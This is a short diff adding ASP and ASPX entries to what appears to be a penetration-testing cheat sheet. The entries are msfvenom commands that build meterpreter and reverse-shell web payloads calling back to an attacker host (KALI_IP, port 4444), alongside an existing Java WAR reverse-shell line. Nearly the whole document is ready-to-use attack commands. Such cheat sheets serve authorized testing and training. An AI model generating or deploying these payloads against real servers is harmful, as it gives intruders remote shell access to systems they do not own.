@@ -1000,6 +1000,21 @@ WAR:
 msfvenom -p java/shell_reverse_tcp LHOST=kali_ip LPORT=4444 -f war -o shell.war
 ```
 
+### ASP and ASPX
+
+```bash
+# asp
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=KALI_IP LPORT=4444 -f asp > meterpreter.asp
+
+# aspx 
+
+#x86 default
+msfvenom -f aspx -p windows/shell_reverse_tcp LHOST=KALI_IP LPORT=4444 -o shell.aspx
+
+#x64
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=KALI_IP LPORT=4444 -o shell.aspx
+```
+
 ---
 
 ## multi/handler
